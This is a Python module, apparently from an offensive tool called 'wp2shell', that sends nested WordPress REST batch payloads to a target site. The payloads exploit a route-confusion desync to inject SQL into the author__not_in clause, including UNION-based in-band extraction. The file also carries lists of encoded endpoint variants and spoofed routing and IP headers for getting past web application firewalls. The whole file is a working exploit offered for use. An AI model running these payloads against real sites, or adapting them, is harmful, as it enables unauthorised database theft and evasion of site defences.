"""HTTP transport and construction of the nested batch route-confusion payloads."""

from __future__ import annotations

import json
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Optional

# A deliberately malformed path (no host, no port) for which wp_parse_url() returns false.
# The client never dials it; its only job is to seed one WP_Error into the batch's request
# list, which is what desynchronises $matches from $validation so a sub-request is dispatched
# under the following sub-request's handler. Any parse_url()-rejecting string works; "///" is
# used so it cannot be mistaken for a network target.
_DESYNC_PRIMER = {"method": "POST", "path": "///"}
_BATCH_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
POSTS_ITEM_SOURCE_PATH = "/wp/v2/posts/999999"


class TargetError(Exception):
    """The target could not be reached (connection refused, DNS failure, timeout)."""


@dataclass
class Response:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


class BatchClient:
    """Sends requests to a target's REST batch endpoint and builds injection payloads."""

    # Endpoint path variants tried in order when a WAF blocks the primary path.
    # Covers: plain-permalink form, pretty-permalink form, path case variations,
    # and double-slash prefix (some WAFs normalise differently).
    # Path-only endpoint variants (no special headers).
    # Ordered from most to least likely to work.
    _ENDPOINT_VARIANTS: tuple = (
        "/?rest_route=/batch/v1",               # primary — plain permalink form
        "/wp-json/batch/v1",                    # pretty-permalink form
        "/index.php/?rest_route=/batch/v1",     # explicit index.php
        "/index.php/wp-json/batch/v1",          # index.php pretty permalink
        "/?rest_route=/batch/v1/",              # trailing slash
        "/wp-json/batch/v1/",                   # trailing slash pretty
        "/?rest_route=/Batch/v1",               # case variant
        "/?rest_route=/batch/V1",               # version case variant
        "/wp-json/Batch/v1",                    # pretty + case
        "/?rest_route=//batch/v1",              # double-slash prefix
        "/wp-json/batch//v1",                   # double-slash in path
        "/?rest_route=/batch/./v1",             # dot segment normalisation
        "/?rest_route=/./batch/v1",             # leading dot segment
        "/?rest_route=/%62atch/v1",             # 'b' hex-encoded
        "/?rest_route=/batch/v%31",             # '1' hex-encoded
        "/?rest_route=/batch%2fv1",             # slash encoded (lowercase)
        "/?rest_route=/batch%2Fv1",             # slash encoded (uppercase)
    )

    # Header-based bypass variants: (path, extra_headers).
    # Some WAFs inspect the URL path but honour override headers for routing.
    _HEADER_BYPASSES: tuple = (
        ("/", {"X-Original-URL": "/?rest_route=/batch/v1"}),
        ("/", {"X-Rewrite-URL": "/?rest_route=/batch/v1"}),
        ("/", {"X-Original-URL": "/wp-json/batch/v1"}),
        ("/", {"X-Rewrite-URL": "/wp-json/batch/v1"}),
        ("/?rest_route=/batch/v1", {"X-Forwarded-For": "127.0.0.1"}),
        ("/?rest_route=/batch/v1", {"X-Real-IP": "127.0.0.1"}),
        ("/?rest_route=/batch/v1", {"CF-Connecting-IP": "127.0.0.1"}),
        ("/wp-json/batch/v1", {"X-Forwarded-For": "127.0.0.1"}),
    )

    @property
    def endpoint(self) -> str:
        return f"{self.base_url}{self._active_endpoint}"

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 30.0,
        proxy: Optional[str] = None,
        user_agent: str = "wp2shell",
        verify_ssl: bool = True,
        verbosity: int = 0,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.user_agent = user_agent
        self.verbosity = verbosity
        self._active_endpoint = self._ENDPOINT_VARIANTS[0]
        self._active_headers: dict = {}  # extra headers required by the active bypass, if any
        handlers = [urllib.request.ProxyHandler({"http": proxy, "https": proxy})] if proxy else []
        if not verify_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        self._opener = urllib.request.build_opener(*handlers)

    def _vlog(self, method: str, url: str, response: "Response", payload: Optional[dict] = None) -> None:
        """Print verbose request/response info based on self.verbosity."""
        if self.verbosity < 1:
            return
        import sys as _sys
        print(f"  [v] {method} {url} -> HTTP {response.status} ({response.elapsed:.3f}s)", file=_sys.stderr)
        if self.verbosity >= 2:
            if payload is not None:
                print(f"  [vv] REQUEST: {json.dumps(payload)}", file=_sys.stderr)
            print(f"  [vv] RESPONSE: {response.body[:4096]}", file=_sys.stderr)

    def _post_to_with_headers(self, url: str, payload: dict, extra_headers: dict) -> Response:
        request = urllib.request.Request(
            url,
            data=json.dumps(payload).encode(),
            method="POST",
            headers={
                "Content-Type": "application/json",
                "User-Agent": self.user_agent,
                **extra_headers,
            },
        )
        start = time.monotonic()
        try:
            resp = self._opener.open(request, timeout=self.timeout)
            status, body = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {url}: {reason}") from None
        response = Response(status, time.monotonic() - start, body)
        self._vlog("POST", url, response, payload)
        return response

    def _post_to(self, url: str, payload: dict) -> Response:
        request = urllib.request.Request(
            url,
            data=json.dumps(payload).encode(),
            method="POST",
            headers={"Content-Type": "application/json", "User-Agent": self.user_agent},
        )
        start = time.monotonic()
        try:
            resp = self._opener.open(request, timeout=self.timeout)
            status, body = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {url}: {reason}") from None
        response = Response(status, time.monotonic() - start, body)
        self._vlog("POST", url, response, payload)
        return response

    def post(self, payload: dict) -> Response:
        if self._active_headers:
            return self._post_to_with_headers(self.endpoint, payload, self._active_headers)
        return self._post_to(self.endpoint, payload)

    def server_info(self) -> tuple[str, str]:
        """Return (ip_address, server_header) for the base URL. Best-effort — never raises."""
        import socket as _socket
        try:
            host = urllib.parse.urlparse(self.base_url).hostname or ""
            ip = _socket.gethostbyname(host)
        except Exception:
            ip = "unknown"
        try:
            request = urllib.request.Request(
                self.base_url + "/",
                method="HEAD",
                headers={"User-Agent": self.user_agent},
            )
            resp = self._opener.open(request, timeout=min(self.timeout, 5))
            server = resp.headers.get("Server", "unknown")
        except urllib.error.HTTPError as exc:
            server = exc.headers.get("Server", "unknown")
        except Exception:
            server = "unknown"
        return ip, server

    def get(self, path: str) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        request = urllib.request.Request(
            url,
            method="GET",
            headers={"User-Agent": self.user_agent},
        )
        start = time.monotonic()
        try:
            resp = self._opener.open(request, timeout=self.timeout)
            status, body = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:  # URLError, connection refused, timeout, DNS failure
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {url}: {reason}") from None
        response = Response(status, time.monotonic() - start, body)
        self._vlog("GET", url, response)
        return response

    def marker_probe(self) -> Response:
        """A benign batch that exposes the vulnerable route-confusion alignment bug.

        When a WAF returns 403 on the primary endpoint path, automatically tries alternative
        path variants (pretty-permalink form, case variations, double-slash prefix). The first
        variant that returns non-403 is cached as the active endpoint for all subsequent requests.
        """
        payload = {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
        resp = self.post(payload)
        if resp.status != 403:
            return resp
        # Primary path blocked — probe alternative path variants.
        for variant in self._ENDPOINT_VARIANTS[1:]:
            url = self.base_url + variant
            try:
                candidate = self._post_to(url, payload)
            except TargetError:
                continue
            # Only accept a response that looks like a real batch endpoint (200/207).
            if candidate.status in (200, 207):
                self._active_endpoint = variant
                return candidate
        # Path variants exhausted — try header-based bypasses.
        for path, extra_headers in self._HEADER_BYPASSES:
            url = self.base_url + path
            try:
                candidate = self._post_to_with_headers(url, payload, extra_headers)
            except TargetError:
                continue
            if candidate.status in (200, 207):
                self._active_endpoint = path
                self._active_headers = extra_headers
                return candidate
        # All bypasses exhausted — return the original 403.
        return resp

    @staticmethod
    def batch_marker_codes(response: Response) -> tuple:
        try:
            body = response.json()
        except ValueError:
            return ()

        found = []

        def walk(value) -> None:
            if isinstance(value, dict):
                code = value.get("code")
                if code in _BATCH_MARKER_CODES and code not in found:
                    found.append(code)
                for child in value.values():
                    walk(child)
            elif isinstance(value, list):
                for child in value:
                    walk(child)

        walk(body)
        return tuple(found)

    @staticmethod
    def has_route_confusion_markers(response: Response) -> bool:
        codes = BatchClient.batch_marker_codes(response)
        return all(code in codes for code in _BATCH_MARKER_CODES)

    def inject(self, author_not_in: str) -> Response:
        """Send a payload placing `author_not_in` into the WP_Query author__not_in clause."""
        return self.post(self._payload(author_not_in))

    def union_inject(self, author_not_in: str) -> Response:
        """Send a payload that lands `author_not_in` in a non-split, no-ORDER-BY WP_Query.

        The source request targets the single-post item route ``/wp/v2/posts/999999``, so it
        validates against the item schema and the collection-only params ``author_exclude``,
        ``orderby`` and ``per_page`` pass through unchecked. The inner desync then dispatches it
        under the posts collection handler, which consumes them:

        - ``orderby=none`` removes the trailing ``ORDER BY {posts}.<col>`` that otherwise makes a
          ``UNION`` fail with "cannot be used in global ORDER clause";
        - ``per_page=500`` keeps ``WP_Query`` in full-row (non-split) mode when no persistent object
          cache is in use, so a ``UNION SELECT`` row survives as a fake ``WP_Post``.

        Together these turn the blind sink into in-band UNION extraction (one request per value).
        """
        return self.post(self._union_payload(author_not_in))

    @staticmethod
    def _union_payload(author_not_in: str) -> dict:
        # Use quote() not urlencode() so spaces become %20 not +.  WordPress's internal
        # batch path router treats paths as URLs where + is a literal plus, not a space,
        # so a payload containing spaces must be percent-encoded with %20 to survive routing.
        query = urllib.parse.urlencode(
            {"author_exclude": author_not_in, "orderby": "none", "per_page": "500"},
            quote_via=urllib.parse.quote,
        )
        inner = {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "GET", "path": POSTS_ITEM_SOURCE_PATH + "?" + query},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    def match_count(self, response: Response) -> Optional[int]:
        """Return X-WP-Total (the matched-row count) from the confused get_items response, else None.

        The item-route source carries no ``page``, so the confused collection can paginate to an
        empty ``body`` even when the injected condition matches rows -- but ``X-WP-Total`` still
        reports the true count, so it, not the body list, is the reliable boolean signal.
        """
        try:
            inner = response.json()["responses"][1]["body"]
            headers = inner["responses"][1]["headers"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        if not isinstance(headers, dict):
            return None
        try:
            return int(headers.get("X-WP-Total"))
        except (TypeError, ValueError):
            return None

    @staticmethod
    def _payload(author_not_in: str) -> dict:
        # Inner batch: a GET on the single-post item route is validated as an item request, whose
        # schema does not define the posts collection's `author_exclude` param. The desync then
        # dispatches the same request under posts get_items(), which maps author_exclude ->
        # WP_Query author__not_in.
        inner = {
            "requests": [
                _DESYNC_PRIMER,
                {
                    "method": "GET",
                    "path": POSTS_ITEM_SOURCE_PATH
                    + "?author_exclude="
                    + urllib.parse.quote(author_not_in, safe=""),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        # Outer batch: a posts request carrying the inner batch as its body is desynced onto the
        # batch handler itself. Validated as a posts request, its `requests` list is never checked
        # against the batch schema, so the inner sub-requests are free to use GET.
        return {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
